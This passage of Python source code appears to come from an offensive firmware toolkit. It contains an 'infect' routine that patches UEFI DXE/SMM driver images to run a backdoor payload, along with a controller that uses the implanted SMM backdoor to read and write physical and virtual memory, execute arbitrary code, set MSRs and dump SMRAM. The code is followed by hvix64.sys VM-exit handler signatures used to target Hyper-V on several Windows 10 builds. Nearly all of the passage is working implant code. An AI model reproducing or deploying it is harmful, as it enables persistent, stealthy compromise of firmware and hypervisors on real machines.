        buff.write('\0' * PAGE_SIZE)
        buff.seek(0)

        # set input arguments
        self._ctl_set('QQQQ', self.STATUS_NONE, addr, size, buff.addr)

        # perform request
        assert self._check_mem_status(self._ctl_send(code)) == self.EFI_SUCCESS

        # get readed data
        return buff.read(size)

    def write_phys_mem(self, addr, data):

        return self._write_mem(BACKDOOR_CTL_WRITE_PHYS, addr, data)

    def read_phys_mem(self, addr, size):

        return self._read_mem(BACKDOOR_CTL_READ_PHYS, addr, size)

    def write_virt_mem(self, addr, data):

        return self._write_mem(BACKDOOR_CTL_WRITE_VIRT, addr, data)

    def read_virt_mem(self, addr, size):

        return self._read_mem(BACKDOOR_CTL_READ_VIRT, addr, size)

    def execute(self, addr):

        # set input arguments
        self._ctl_set('QQ', self.STATUS_NONE, addr)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_EXECUTE) == 0

    def msr_get(self, reg):

        # set input arguments
        self._ctl_set('QQQ', self.STATUS_NONE, reg, 0)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_MSR_GET) == 0

        _, val = self._ctl_get('QQ')

        return val

    def msr_set(self, reg, val):

        # set input arguments
        self._ctl_set('QQQ', self.STATUS_NONE, reg, val)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_MSR_SET) == 0

    def state_get(self, reg):

        # set input arguments
        self._ctl_set('QQQ', self.STATUS_NONE, reg, 0)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_STATE_GET) == 0

        _, val = self._ctl_get('QQ')

        return val

    def state_set(self, reg, val):

        # set input arguments
        self._ctl_set('QQQ', self.STATUS_NONE, reg, val)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_STATE_SET) == 0

    def timer_enable(self):

        # enable periodic timer SW SMI
        self._ctl_send_smi(BACKDOOR_CTL_TIMER_ENABLE, 0)

    def timer_disable(self):

        # disable periodic timer SW SMI
        self._ctl_send_smi(BACKDOOR_CTL_TIMER_DISABLE, 0)

    def get_phys_addr(self, addr_virt, cr3 = 0, eptp = 0):

        eptp = 1 if eptp is None else eptp

        # set input arguments
        self._ctl_set('QQQQQ', self.STATUS_NONE, addr_virt, 0, eptp, cr3)

        # perform request
        if self._ctl_send(BACKDOOR_CTL_GET_PHYS_ADDR) != 0:

            # unable to translate virtual to physical
            return None

        _, addr_phys = self._ctl_get('QQ')

        return addr_phys

    def find_vmcs(self, addr, size = None):

        # set input arguments
        self._ctl_set('QQQQ', self.STATUS_NONE, addr, PAGE_SIZE if size is None else size, 0)

        # perform request
        if self._ctl_send(BACKDOOR_CTL_FIND_VMCS) != 0:

            # unable to locate VMCS within specified memory region
            return None

        _, _, vmcs_addr = self._ctl_get('QQQ')

        return vmcs_addr if vmcs_addr != 0 else None


def infect(src, payload, dst = None):

    try:

        import pefile

    except ImportError:

        print('ERROR: pefile is not installed')
        exit(-1)

    def _infector_config_offset(pe):
        
        for section in pe.sections:

            # find .conf section of payload image
            if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

                return section.PointerToRawData

        raise Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION)

    def _infector_config_get(pe, data):

        offs = _infector_config_offset(pe)
        
        return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        

    def _infector_config_set(pe, data, *args):

        offs = _infector_config_offset(pe)

        return data[: offs] + \
               pack(INFECTOR_CONFIG_FMT, *args) + \
               data[offs + INFECTOR_CONFIG_LEN :]

    # load target image
    pe_src = pefile.PE(src)

    # load payload image
    pe_payload = pefile.PE(payload)
    
    if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:

        raise Exception('%s is already infected' % src)        

    if pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:

        raise Exception('Architecture missmatch')

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    val_1, val_2, val_3, conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data) 

    last_section = None
    for section in pe_src.sections:

        # find last section of target image
        last_section = section

    if last_section.Misc_VirtualSize > last_section.SizeOfRawData:

        raise Exception('Last section virtual size must be less or equal than raw size')

    # save original entry point address of target image
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint

    print('Original entry point RVA is 0x%.8x' % conf_ep_old )
    print('Original %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe_payload, data, val_1, val_2, val_3, conf_ep_new, conf_ep_old)

    # set new entry point of target image
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new    

    # update last section size
    last_section.SizeOfRawData += len(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    # make it executable
    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']  

    print('Characteristics of %s section was changed to RWX' % last_section.Name.split('\0')[0])

    # update image headers
    pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN    

    print('New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint)
    print('New %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # get infected image data
    data = pe_src.write() + data

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

    return data


def hexdump(data, width = 16, addr = 0):

    ret = ''

    def quoted(data):

        # replace non-alphanumeric characters
        return ''.join(map(lambda b: b if b.isalnum() else '.', data))

    while data:

        line = data[: width]
        data = data[width :]

        # put hex values
        s = map(lambda b: '%.2x' % ord(b), line)
        s += [ '  ' ] * (width - len(line))

        # put ASCII values
        s = '%s | %s' % (' '.join(s), quoted(line))

        if addr is not None:

            # put address
            s = '%.8x: %s' % (addr, s)
            addr += len(line)

        ret += s + '\n'

    return ret


def init(use_timer = False):

    global cs    

    if cs is None and not use_timer:
    
        # initialize chipsec
        cs = ChipsecWrapper()

    else:

        cs = None


def backdoor_debug_print():

    assert cs is not None

    print('[+] Obtaining backdoor debug information...')

    try:

        # get debug messages buffer address
        addr = cs.efi_var_get_64(BACKDOOR_VAR)

    except cs.NoSuchVariable, e:

        print('ERROR: ' + str(e))
        return

    print('[+] Debug output buffer physical address is 0x%x' % addr)

    # read debug output
    data = cs.mem_read(addr, DEBUG_OUTPUT_SIZE)
    data = data.split('\0')[0]

    num = 1

    print('')

    # print debug output to the console
    for line in data.split('\r\n'):

        line = line.strip()
        if len(line) > 0:

            print('%.8d - %s' % (num, line))
            num += 1

    print('')


def backdoor_debug_flush():

    assert cs is not None

    print('[+] Obtaining backdoor debug information...')

    try:

        # get debug messages buffer address
        addr = cs.efi_var_get_64(BACKDOOR_VAR)

    except cs.NoSuchVariable, e:

        print('ERROR: ' + str(e))
        return

    print('[+] Debug output buffer physical address is 0x%x' % addr)

    # erase debug output
    cs.mem_write(addr, '\0' * DEBUG_OUTPUT_SIZE)

    print('[+] Debug output buffer was erased')


def backdoor_test():

    bd = BackdoorControl(cs)

    print('[+] Checking if SMM backdoor is present...')

    # check if backdoor is present
    bd.ping()

    print('[+] Obtaining information...')

    # get backdoor info
    info = bd.info()    

    print('')
    print('  CR0 = 0x%x' % info.cr0)
    print('  CR3 = 0x%x' % info.cr3)
    print(' SMST = 0x%x' % info.smst)
    print('')

    if len(info.smram) > 0:

        print('[+] SMRAM regions:\n')

        for region_addr, region_size in info.smram:

            print(' * 0x%.8x:%.8x' % (region_addr, region_addr + region_size - 1))

        print('')


def execute(addr):

    bd = BackdoorControl(cs)

    # execute code at given address
    bd.execute(addr)


def msr_get(reg):

    bd = BackdoorControl(cs)

    return bd.msr_get(reg)


def msr_set(reg, val):

    bd = BackdoorControl(cs)

    bd.msr_set(reg, val)


def state_get(reg):

    bd = BackdoorControl(cs)

    return bd.state_get(reg)


def state_set(reg, val):

    bd = BackdoorControl(cs)

    bd.state_set(reg, val)


def timer_enable():

    bd = BackdoorControl(cs)

    bd.timer_enable()


def timer_disable():

    bd = BackdoorControl(cs)

    bd.timer_disable()


def get_phys_addr(addr_virt, cr3 = 0, eptp = 0):

    bd = BackdoorControl(cs)

    return bd.get_phys_addr(addr_virt, cr3 = cr3, eptp = eptp)


def find_vmcs(addr, size = None):

    bd = BackdoorControl(cs)

    return bd.find_vmcs(addr, size = size)


def smram_info():

    bd = BackdoorControl(cs)

    # get backdoor information
    info = bd.info()

    # return SMRAM regions list
    return info.smram


def ping():

    bd = BackdoorControl(cs)

    # check if backdoor is present
    bd.ping()


def smram_dump():        

    bd = BackdoorControl(cs)

    # get SMRAM information
    regions, contents = smram_info(), []
    regions_merged = []

    if len(regions) > 1:

        # join neighbour regions
        for i in range(0, len(regions) - 1):

            curr_addr, curr_size = regions[i]
            next_addr, next_size = regions[i + 1]

            if curr_addr + curr_size == next_addr:

                # join two regions
                regions[i + 1] = ( curr_addr, curr_size + next_size )

            else:

                # copy region information
                regions_merged.append(( curr_addr, curr_size ))

        region_addr, region_size = regions[-1]
        regions_merged.append(( region_addr, region_size ))

    elif len(regions) > 0:

        regions_merged = regions

    else:

        raise(Exception('No SMRAM regions found'))

    print('[+] Dumping SMRAM regions, this may take a while...')

    try:

        # enumerate and dump available SMRAM regions
        for region in regions_merged: 
            
            region_addr, region_size = region            
            name = 'SMRAM_dump_%.8x_%.8x.bin' % (region_addr, region_addr + region_size - 1)
            data = ''
            
            for i in range(0, region_size / PAGE_SIZE):

                # dump region contents
                data += bd.read_phys_mem(region_addr + (i * PAGE_SIZE), PAGE_SIZE)

            contents.append(( name, data ))

        # save dumped data to files
        for name, data in contents:

            with open(name, 'wb') as fd:

                print('[+] Creating %s' % name)
                fd.write(data) 

    except IOError, why:

        print('ERROR: %s' % str(why))
        return False

    return True


def _backdoor_read_mem(addr, size, virt = False):

    data = ''

    bd = BackdoorControl(cs)
    
    # perform memory reads
    while size > 0:

        # calculate chunk length to not cross page boundary
        chunk_size = PAGE_SIZE if addr & 0xfff == 0 else (align_up(addr, PAGE_SIZE) - addr)
        chunk_size = min(size, chunk_size)

        if virt:

            # virtual memory read operation
            data += bd.read_virt_mem(addr, chunk_size)

        else:

            # physical memory read operation
            data += bd.read_phys_mem(addr, chunk_size)

        size -= chunk_size
        addr += chunk_size

    return data


def _backdoor_write_mem(addr, data, virt = False):

    size = len(data)

    bd = BackdoorControl(cs)
    
    # perform memory reads
    while size > 0:

        # calculate chunk length to not cross page boundary
        chunk_size = PAGE_SIZE if addr & 0xfff == 0 else (align_up(addr, PAGE_SIZE) - addr)
        chunk_size = min(size, chunk_size)

        # data chunk to write
        chunk = data[len(data) - size : len(data) - size + chunk_size]

        if virt:

            # virtual memory write operation
            bd.write_virt_mem(addr, chunk)

        else:

            # physical memory write operation
            bd.write_phys_mem(addr, chunk)

        size -= chunk_size
        addr += chunk_size


def read_phys_mem(addr, size):

    return _backdoor_read_mem(addr, size, virt = False)

def write_phys_mem(addr, data):

    _backdoor_write_mem(addr, data, virt = False)

def read_phys_mem_1(addr): 

    return unpack('B', read_phys_mem(addr, 1))[0]

def read_phys_mem_2(addr): 

    return unpack('H', read_phys_mem(addr, 2))[0]

def read_phys_mem_4(addr): 

    return unpack('I', read_phys_mem(addr, 4))[0]

def read_phys_mem_8(addr): 

    return unpack('Q', read_phys_mem(addr, 8))[0]

def write_phys_mem_1(addr, val): 

    write_phys_mem(addr, pack('B', val))

def write_phys_mem_2(addr, val): 

    write_phys_mem(addr, pack('H', val))

def write_phys_mem_4(addr, val): 

    write_phys_mem(addr, pack('I', val))

def write_phys_mem_8(addr, val): 

    write_phys_mem(addr, pack('Q', val))


def read_virt_mem(addr, size, cr3 = 0, eptp = 0):

    if cr3 != 0:

        # do the manual address translation
        addr_phys = get_phys_addr(addr, cr3 = cr3, eptp = eptp)

        return read_phys_mem(addr_phys, size)

    else:

        # backdoor will do the address translation by itself
        return _backdoor_read_mem(addr, size, virt = True)

def write_virt_mem(addr, data, cr3 = 0, eptp = 0):

    if cr3 != 0:

        # do the manual address translation
        addr_phys = get_phys_addr(addr, cr3 = cr3, eptp = eptp)

        write_phys_mem(addr_phys, data)

    else:

        # backdoor will do the address translation by itself
        _backdoor_write_mem(addr, data, virt = True)

def read_virt_mem_1(addr, cr3 = 0, eptp = 0): 

    return unpack('B', read_virt_mem(addr, 1, cr3 = cr3, eptp = eptp))[0]

def read_virt_mem_2(addr, cr3 = 0, eptp = 0): 

    return unpack('H', read_virt_mem(addr, 2, cr3 = cr3, eptp = eptp))[0]

def read_virt_mem_4(addr, cr3 = 0, eptp = 0): 

    return unpack('I', read_virt_mem(addr, 4, cr3 = cr3, eptp = eptp))[0]

def read_virt_mem_8(addr, cr3 = 0, eptp = 0): 

    return unpack('Q', read_virt_mem(addr, 8, cr3 = cr3, eptp = eptp))[0]

def write_virt_mem_1(addr, val, cr3 = 0, eptp = 0): 

    write_virt_mem(addr, pack('B', val), cr3 = cr3, eptp = eptp)

def write_virt_mem_2(addr, val, cr3 = 0, eptp = 0): 

    write_virt_mem(addr, pack('H', val), cr3 = cr3, eptp = eptp)

def write_virt_mem_4(addr, val, cr3 = 0, eptp = 0): 

    write_virt_mem(addr, pack('I', val), cr3 = cr3, eptp = eptp)

def write_virt_mem_8(addr, val, cr3 = 0, eptp = 0): 

    write_virt_mem(addr, pack('Q', val), cr3 = cr3, eptp = eptp)


class TestPhysMemAccess(unittest.TestCase):

    def __init__(self, method):

        init()

        super(TestPhysMemAccess, self).__init__(method)

    def smram_start(self):
        ''' Get address of the first SMRAM region. '''

        return smram_info()[0][0]

    def test_mem(self):
        ''' Test regular memory read/write operations. '''

        addr = self.smram_start()

        data = read_phys_mem(addr, 0x20)

        write_phys_mem(addr, data)

    def test_normal(self, addr = None):
        ''' Test byte/word/dword/qword memory operations. '''

        addr = self.smram_start() if addr is None else addr

        val = 0x0102030405060708

        old = read_phys_mem_8(addr)

        write_phys_mem_8(addr, val)

        assert read_phys_mem_1(addr) == val & 0xff
        assert read_phys_mem_2(addr) == val & 0xffff
        assert read_phys_mem_4(addr) == val & 0xffffffff
        assert read_phys_mem_8(addr) == val

        write_phys_mem_8(addr, old)

    def test_unaligned(self, addr = None):
        ''' Test unaligned memory operations. '''

        addr = self.smram_start() if addr is None else addr

        val = int(time.time())

        old = read_phys_mem_8(addr)

        write_phys_mem_8(addr, 0)
        write_phys_mem_4(addr + 1, val)

        assert read_phys_mem_8(addr) == val << 8

        write_phys_mem_8(addr, 0)
        write_phys_mem_4(addr + 2, val)

        assert read_phys_mem_8(addr) == val << 16

        write_phys_mem_8(addr, 0)
        write_phys_mem_4(addr + 3, val)

        assert read_phys_mem_8(addr) == val << 24

        write_phys_mem_8(addr, old)

    def test_cross_page(self):
        ''' Test cross page boundary memory operations. '''

        addr = self.smram_start() + PAGE_SIZE

        self.test_normal(addr = addr - 1)
        
        self.test_unaligned(addr = addr - 2)

        self.test_normal(addr = addr - 2)
        
        self.test_unaligned(addr = addr - 3)

        self.test_normal(addr = addr - 3)
        
        self.test_unaligned(addr = addr - 4)


class TestVirtMemAccess(unittest.TestCase):

    def __init__(self, method):

        self.mem_size = PAGE_SIZE * 2

        # allocate test memory pages
        self.mem = mem_alloc(self.mem_size)
        self.mem.write('\0' * self.mem_size)

        init()

        super(TestVirtMemAccess, self).__init__(method)    

    def test_mem(self):
        ''' Test regular memory read/write operations. '''

        data = read_virt_mem(self.mem.addr, 0x20)

        write_virt_mem(self.mem.addr, data)

    def test_normal(self, addr = None):
        ''' Test byte/word/dword/qword memory operations. '''

        addr = self.mem.addr if addr is None else addr

        val = 0x0102030405060708

        old = read_virt_mem_8(addr)

        write_virt_mem_8(addr, val)

        assert read_virt_mem_1(addr) == val & 0xff
        assert read_virt_mem_2(addr) == val & 0xffff
        assert read_virt_mem_4(addr) == val & 0xffffffff
        assert read_virt_mem_8(addr) == val

        write_virt_mem_8(addr, old)

    def test_unaligned(self, addr = None):
        ''' Test unaligned memory operations. '''

        addr = self.mem.addr if addr is None else addr

        val = int(time.time())

        old = read_virt_mem_8(addr)

        write_virt_mem_8(addr, 0)
        write_virt_mem_4(addr + 1, val)

        assert read_virt_mem_8(addr) == val << 8

        write_virt_mem_8(addr, 0)
        write_virt_mem_4(addr + 2, val)

        assert read_virt_mem_8(addr) == val << 16

        write_virt_mem_8(addr, 0)
        write_virt_mem_4(addr + 3, val)

        assert read_virt_mem_8(addr) == val << 24

        write_virt_mem_8(addr, old)

    def test_cross_page(self):
        ''' Test cross page boundary memory operations. '''

        addr = self.mem.addr + PAGE_SIZE
        
        self.test_normal(addr = addr - 1)
        
        self.test_unaligned(addr = addr - 2)

        self.test_normal(addr = addr - 2)
        
        self.test_unaligned(addr = addr - 3)

        self.test_normal(addr = addr - 3)
        
        self.test_unaligned(addr = addr - 4)


class TestSaveState(unittest.TestCase):

    def __init__(self, method):

        init()

        super(TestSaveState, self).__init__(method)

    def test_get(self):
        ''' Test saved state register get. '''

        global cs

        class TestChipsecWrapper(object):

            def __init__(self, cs):

                self.cs = cs

            def send_sw_smi(self, code, data, rax = 0, rbx = 0, rcx = 0, rdx = 0, rsi = 0, rdi = 0):

                self.cs.send_sw_smi(code, data, 
                                    rax = rax, rbx = rbx, rcx = rcx, 
                                    rdx = rdx, rsi = rsi, rdi = 0x1337)

        cs_old = cs

        # set up fake chipsec wrapper
        cs = TestChipsecWrapper(cs_old)

        # check RDI value read from saved state area
        assert state_get(SMM_SAVE_STATE_RDI) == 0x1337

        cs = cs_old

    def test_set(self):
        ''' Test saved state register set. '''

        state_set(SMM_SAVE_STATE_RDI, 0x1337)


class TestMsr(unittest.TestCase):

    IA32_APERF = 0xe8 # actual performance clock counter MSR

    def __init__(self, method):

        init()

        super(TestMsr, self).__init__(method)

    def test_get(self):
        ''' Test MSR read access. '''

        val_1 = msr_get(self.IA32_APERF)
        val_2 = msr_get(self.IA32_APERF)
        val_3 = msr_get(self.IA32_APERF)
        val_4 = msr_get(self.IA32_APERF)

        # check for the incrementing counter
        assert val_2 > val_1 and val_3 > val_2 and val_4 > val_3

    def test_set(self):
        ''' Test MSR write access. '''

        mask = (1 << 63)

        msr_set(self.IA32_APERF, 0)

        assert msr_get(self.IA32_APERF) & mask == 0

        msr_set(self.IA32_APERF, mask)

        assert msr_get(self.IA32_APERF) & mask == mask

        msr_set(self.IA32_APERF, 0)


class TestPhysAddr(unittest.TestCase):

    def __init__(self, method):

        self.mem_size = PAGE_SIZE
        self.mem_data = ''.join(map(lambda x: chr(x), range(0, 0xff)))

        # allocate test memory page
        self.mem = mem_alloc(self.mem_size)
        self.mem.write(self.mem_data)

        init()

        super(TestPhysAddr, self).__init__(method)

    def test(self):
        ''' Test virtual to physical address translation. '''

        phys_addr = get_phys_addr(self.mem.addr)

        assert self.mem_data == read_phys_mem(phys_addr, len(self.mem_data))


def main():    

    option_list = [

        make_option('-i', '--infect', dest = 'infect', default = None,
            help = 'infect existing DXE, SMM or combined driver image'),

        make_option('-p', '--payload', dest = 'payload', default = None,
            help = 'infect payload path'),

        make_option('-o', '--output', dest = 'output', default = None,
            help = 'file path to save infected file'),

        make_option('-t', '--test', dest = 'test', action = 'store_true', default = False,
            help = 'test system for active infection'),

        make_option('-d', '--dump-smram', dest = 'dump_smram', action = 'store_true', default = False,
            help = 'dump SMRAM contents into the file'), 

        make_option('-s', '--size', dest = 'size', default = PAGE_SIZE,
            help = 'read size for --read-phys and --read-virt'),

        make_option('--read-phys', dest = 'read_phys', default = None,
            help = 'read physical memory page'),

        make_option('--read-virt', dest = 'read_virt', default = None,
            help = 'read virtual memory page'),        

        make_option('--read-state', dest = 'read_state', default = None,
            help = 'read SMRAM saved state area field'),        

        make_option('--debug', dest = 'debug_print', action = 'store_true', default = False,
            help = 'print backdoor debug information'),

        make_option('--debug-flush', dest = 'debug_flush', action = 'store_true', default = False,
            help = 'flush backdoor debug information buffer'),

        make_option('--use-timer', dest = 'use_timer', action = 'store_true', default = False,
            help = 'use periodic timer to communicate with the backdoor'),

        make_option('--timer-enable', dest = 'timer_enable', action = 'store_true', default = False,
            help = 'enable periodic timer SW SMI'),

        make_option('--timer-disable', dest = 'timer_disable', action = 'store_true', default = False,
            help = 'enable periodic timer SW SMI')
    ]

    parser = OptionParser(option_list = option_list)
    options, args = parser.parse_args()

    if options.infect is not None:

        if options.payload is None:

            print('[!] --payload must be specified')
            return -1

        print('[+] Target image to infect: %s' % options.infect)
        print('[+] Infector payload: %s' % options.payload)

        if options.output is None:

            backup = options.infect + '.bak'
            options.output = options.infect

            print('[+] Backup: %s' % backup)

            # backup original file
            shutil.copyfile(options.infect, backup)

        print('[+] Output file: %s' % options.output)

        # infect source file with specified payload
        infect(options.infect, options.payload, dst = options.output) 

        print('[+] DONE')

        return 0

    elif options.debug_print:

        init(use_timer = False)
        
        backdoor_debug_print()

        return 0

    elif options.debug_flush:

        init(use_timer = False)
        
        backdoor_debug_flush()

        return 0

    elif options.test:

        init(use_timer = options.use_timer)
        
        backdoor_test()

        return 0

    elif options.read_phys is not None:

        size = int(options.size, 16)
        addr = int(options.read_phys, 16)        

        init(use_timer = options.use_timer)
        
        print(hexdump(read_phys_mem(addr, size), addr = addr))

        return 0

    elif options.read_virt is not None:

        size = int(options.size, 16)
        addr = int(options.read_virt, 16)

        init(use_timer = options.use_timer)
        
        print(hexdump(read_virt_mem(addr, size), addr = addr))

        return 0

    elif options.read_state is not None:

        reg_name = 'SMM_SAVE_STATE_' + options.read_state.strip().upper()

        try:

            init(use_timer = options.use_timer)
            
            print('%s = 0x%.16x' % (reg_name, state_get(globals()[reg_name])))

            return 0

        except KeyError:

            print 'ERROR: Unknown SMRAM saved state register name'
            return -1

    elif options.timer_enable:

        init(use_timer = options.use_timer)

        timer_enable()

        return 0

    elif options.timer_disable:

        init(use_timer = options.use_timer)
        
        timer_disable()

        return 0

    elif options.dump_smram:

        init(use_timer = options.use_timer)
        
        smram_dump()

        return 0

    else:

        print('No actions specified, try --help')
        return -1    
    
if __name__ == '__main__':
    
    exit(main())

#
# EoF
#

```

`smm_backdoor_hyper_v.py`:

```py
#!/usr/bin/env python

import sys, os, time, platform, ctypes
from struct import pack, unpack
from optparse import OptionParser, make_option

import smm_backdoor as bd

# how many seconds to wait for VM exit occur
VM_EXIT_WAIT = 3

# max memory address of HOST_CR3
HV_MAX_CR3 = 0x200000000

# max number of VMCS bytes to scan for HOST_CR3 and HOST_RIP
HV_MAX_VMCS = 0x100

# Hyper-V image section alignment
HV_IMAGE_ALIGN = 0x200000

# Hyper-V image max size
HV_MAX_IMAGE_SIZE = 0x2000000

# Present flag of PML4, PDPTE, PDE and PTE
PT_PRESENT = 0x01

# RW flag of PDPTE, PDE and PTE
PT_RW = 0x02

# Page Size flag of PDPTE and PDE
PT_PS = 0x80

pfn_to_page = lambda val: ((val >> bd.PAGE_SHIFT) & 0xffffffffff) << bd.PAGE_SHIFT

# get MPL4 address from CR3 register value
PML4_address = lambda val: val & 0xfffffffffffff000

# get address translation indexes from virtual address
PML4_index = lambda addr: (addr >> 39) & 0x1ff
PDPT_index = lambda addr: (addr >> 30) & 0x1ff
PDE_index  = lambda addr: (addr >> 21) & 0x1ff
PTE_index  = lambda addr: (addr >> 12) & 0x1ff

# Hyper-V backdoor body file path
BACKDOOR_PATH = 'hyper_v_backdoor.bin'

# ofsset of the backdoor code from the beginning of HvlpLowMemoryStub()
BACKDOOR_OFFSET = 0x400

# size of HVBD_DATA structure, see HyperV.c
HVBD_DATA_SIZE = 0x4b0

# VmExitHandler and Version field offsets of HVBD_DATA structure
HVBD_HANDLER = 4 * 8
HVBD_VERSION = 5 * 8

m_verbose = False

# VMCS memory scan options
mem_scan_step = 0x001000000
mem_scan_from = 0x100000000
mem_scan_to   = 0x200000000

'''

VM exit handler signature for Windows 10 1709:

    .text:FFFFF80000265125      mov     [rsp+arg_20], rcx
    .text:FFFFF8000026512A      xor     ecx, ecx
    .text:FFFFF8000026512C      mov     [rsp+arg_28], rcx
    .text:FFFFF80000265131      mov     rcx, [rsp+arg_18]
    .text:FFFFF80000265136      mov     [rcx], rax
    .text:FFFFF80000265139      mov     [rcx+8], rcx
    
    ...

    .text:FFFFF8000026516D      mov     [rcx+78h], r15
    .text:FFFFF80000265171      mov     rax, [rsp+arg_20]
    .text:FFFFF80000265176      mov     [rcx+8], rax
    .text:FFFFF8000026517A      lea     rax, [rcx+100h]

    ...

    .text:FFFFF800002651A6      mov     rdx, [rsp+arg_28]
    .text:FFFFF800002651AB      call    sub_FFFFF80000219B00

'''
HV_SIG_1709 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x11, 0x48), (0x12, 0x89), (0x13, 0x01),
                 (0x14, 0x48), (0x15, 0x89), (0x16, 0x49), (0x17, 0x08),
                 (0x48, 0x4c), (0x49, 0x89), (0x4a, 0x79), (0x4b, 0x78),
                 (0x86, 0xe8) ], 0x86, 16299 ]

'''

Match hvix64.sys VM exit handler signature for Windows 10 1803:

    .text:FFFFF8000027A150      mov     [rsp+arg_20], rcx
    .text:FFFFF8000027A155      xor     ecx, ecx
    .text:FFFFF8000027A157      mov     [rsp+arg_28], rcx
    .text:FFFFF8000027A15C      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000027A161      mov     [rcx], rax
    .text:FFFFF8000027A164      mov     [rcx+8], rcx
    
    ...

    .text:FFFFF8000027A198      mov     [rcx+78h], r15
    .text:FFFFF8000027A19C      mov     rax, [rsp+arg_20]
    .text:FFFFF8000027A1A1      mov     [rcx+8], rax
    .text:FFFFF8000027A1A5      lea     rax, [rcx+100h]

    ...

    .text:FFFFF8000027A222      mov     rdx, [rsp+arg_28]
    .text:FFFFF8000027A227      call    sub_FFFFF80000219C10

'''
HV_SIG_1803 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x11, 0x48), (0x12, 0x89), (0x13, 0x01),
                 (0x14, 0x48), (0x15, 0x89), (0x16, 0x49), (0x17, 0x08),
                 (0x48, 0x4c), (0x49, 0x89), (0x4a, 0x79), (0x4b, 0x78),
                 (0xd7, 0xe8) ], 0xd7, 17134 ]

'''

VM exit handler signature for Windows 10 1809:

    .text:FFFFF8000028B414      mov     [rsp+arg_20], rcx
    .text:FFFFF8000028B419      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000028B41E      mov     rcx, [rcx]
    .text:FFFFF8000028B421      mov     [rcx], rax
    .text:FFFFF8000028B424      mov     [rcx+10h], rdx
    
    ...

    .text:FFFFF8000028B454      mov     [rcx+78h], r15
    .text:FFFFF8000028B458      mov     rax, [rsp+arg_20]
    .text:FFFFF8000028B45D      mov     [rcx+8], rax
    .text:FFFFF8000028B461      lea     rax, [rcx+70h]

    ...

    .text:FFFFF8000028B52D      mov     rdx, [rsp+arg_28]
    .text:FFFFF8000028B532      call    sub_FFFFF800002174F0

'''
HV_SIG_1809 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x0d, 0x48), (0x0e, 0x89), (0x0f, 0x01),
                 (0x10, 0x48), (0x11, 0x89), (0x12, 0x51), (0x13, 0x10),
                 (0x40, 0x4c), (0x41, 0x89), (0x42, 0x79), (0x43, 0x78),
                 (0x11e, 0xe8) ], 0x11e, 17763 ]

'''

VM exit handler signature for Windows 10 1903 and 1909:

    .text:FFFFF8000026C39F      mov     [rsp+arg_20], rcx
    .text:FFFFF8000026C3A4      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000026C3A9      mov     rcx, [rcx]
    .text:FFFFF8000026C3AC      mov     [rcx], rax
    .text:FFFFF8000026C3AF      mov     [rcx+10h], rdx
    
    ...

    .text:FFFFF8000026C3DF      mov     [rcx+78h], r15
    .text:FFFFF8000026C3E3      mov     rax, [rsp+arg_20]
    .text:FFFFF8000026C3E8      mov     [rcx+8], rax
    .text:FFFFF8000026C3EC      lea     rax, [rcx+70h]

    ...

    .text:FFFFF8000026C4B2      mov     rdx, [rsp+arg_28]
    .text:FFFFF8000026C4B7      call    sub_FFFFF80000229F40

'''
HV_SIG_1903 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x0d, 0x48), (0x0e, 0x89), (0x0f, 0x01),
                 (0x10, 0x48), (0x11, 0x89), (0x12, 0x51), (0x13, 0x10),
                 (0x40, 0x4c), (0x41, 0x89), (0x42, 0x79), (0x43, 0x78),
                 (0x118, 0xe8) ], 0x118, 18362 ]

'''

Match hvix64.sys VM exit handler signature for Windows 10 2004 and 20H2:

    .text:FFFFF80000232372      mov     [rsp+arg_20], rcx
    .text:FFFFF80000232377      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000023237C      mov     rcx, [rcx]
    .text:FFFFF8000023237F      mov     [rcx], rax
    .text:FFFFF80000232382      mov     [rcx+10h], rdx
    
    ...

    .text:FFFFF800002323B2      mov     [rcx+78h], r15
    .text:FFFFF800002323B6      mov     rax, [rsp+arg_20]
    .text:FFFFF800002323BB      mov     [rcx+8], rax
    .text:FFFFF800002323BF      lea     rax, [rcx+70h]
    
    ...

